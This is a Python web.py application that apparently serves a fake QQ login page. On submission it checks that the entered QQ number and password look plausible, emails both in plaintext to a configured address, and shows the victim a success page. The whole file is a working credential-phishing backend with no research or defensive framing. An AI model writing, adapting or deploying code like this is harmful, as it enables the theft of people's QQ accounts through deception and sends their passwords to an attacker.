import os
import re
import web

from jinja2 import Environment, FileSystemLoader

from config import *

templates_path = os.getcwd()

env = Environment(loader=FileSystemLoader(templates_path))

web.config.smtp_server = smtp_server
web.config.smtp_port = smtp_port
web.config.smtp_username = smtp_username
web.config.smtp_password = smtp_password
web.config.smtp_starttls = True

def check_qq(qq_number, qq_password):
    regex = ur'''[1-9][0-9]{4,}'''
    return re.match(regex, qq_number) and len(qq_password) >= 6

class HomeHandler():
    def GET(self):
        return env.get_template("index.html").render(
            logged = False,
            wrong_qq = False
            )

    def POST(self):
        data = web.input()
        if check_qq(data.number, data.pd):
            content = '''
            QQ Number: %s
            QQ Password: %s
            ''' % (data.number, data.pd)
            web.sendmail(smtp_username, email, 'QQ', content)
            return env.get_template("index.html").render(
                logged = True,
                wrong_qq = False
                )
        else:
            return env.get_template("index.html").render(
                logged = False,
                wrong_qq = True
                )

urls=(
    '/', 'HomeHandler',
)

app = web.application(urls, globals())

if __name__ == "__main__":
    app.run()
